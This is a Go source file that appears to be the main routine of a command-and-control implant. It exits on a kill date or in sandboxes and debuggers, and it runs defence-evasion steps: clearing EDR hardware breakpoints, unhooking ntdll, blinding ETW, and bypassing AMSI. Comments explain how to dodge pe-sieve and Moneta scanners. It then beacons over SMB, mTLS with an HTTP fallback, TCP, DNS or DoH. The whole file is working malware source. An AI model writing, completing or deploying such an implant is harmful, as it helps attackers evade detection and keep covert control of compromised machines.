package agent

import (
	"os"
	"strings"
	"time"
)

func Main() {
	if KillDate != "" {
		if t, err := time.Parse("2006-01-02", KillDate); err == nil {
			if time.Now().After(t) {
				os.Exit(0)
			}
		}
	}

	if SandboxChecks == "true" && (isSandbox() || isDebugged()) {
		os.Exit(0)
	}

	if !checkGuardrails() {
		os.Exit(0)
	}

	if EvasionPatches != "false" {
		// Evasion patches run before any beaconing or .NET loads.
		// Order matters: clear any EDR-installed HW breakpoints FIRST, then
		// install our own (VEH AMSI bypass). patchETW() is intentionally removed —
		// it modifies EtwEventWrite bytes in ntdll which is flagged by pe-sieve/Moneta.
		// disableETWProcess() achieves ETW blinding without touching ntdll memory.
		clearHardwareBreakpoints() // clear EDR hw-bp before setting our own
		unhookNtdll()
		disableETWProcess() // blind ETW via NtSetInformationProcess — no ntdll bytes modified
		if AMSIMethod == "veh" {
			patchAMSIVEH() // hardware breakpoint + VEH: zero amsi.dll modifications
		} else {
			patchAMSI() // fallback: byte patch (amsi.dll .text modification, pe-sieve detects)
		}
		// wipePEHeaders() intentionally removed — zeroing MZ bytes causes pe-sieve
		// malformed_header + Moneta "Modified PE header" detections (compares memory vs disk).
		// Modern memory scanners flag modified headers; only primitive scanners need the MZ trick.
	}

	var t transport
	var err error

	switch Transport {
	case "smb":
		pipe := SMBPipe
		if pipe == "" {
			pipe = `\\.\pipe\svcctl`
		}
		t, err = newSMBTransport(pipe)
		if err != nil {
			t = newHTTPTransport(ServerURL)
		}
	case "mtls":
		if AgentCertPEM != "" {
			t, err = newMTLSTransport(ServerURL, AgentCertPEM, AgentKeyPEM, CACertPEM)
			if err != nil {
				// mTLS init failed (e.g. donut string corruption). Derive a plain HTTP
				// fallback URL from ServerURL (replace https:// → http:// and :8443 → :8080)
				// so the agent can still check in without TLS certificate verification.
				fallback := strings.Replace(ServerURL, "https://", "http://", 1)
				fallback = strings.Replace(fallback, ":8443", ":8080", 1)
				if fallback == ServerURL {
					// No substitution happened — URL format unexpected, try as-is
					fallback = HTTPFallbackURL
					if fallback == "" {
						fallback = ServerURL
					}
				}
				t = newHTTPTransport(fallback)
			}
		} else {
			t = newHTTPTransport(ServerURL)
		}
	case "tcp":
		t = newTCPTransport(ServerURL)
		_ = err
	case "dns":
		dt := newDNSTransport()
		t = dt
		_ = err
	case "doh":
		t = newDoHTransport(ServerURL)
		_ = err
	default:
		t = newHTTPTransport(ServerURL)
	}

	Run(t)
}
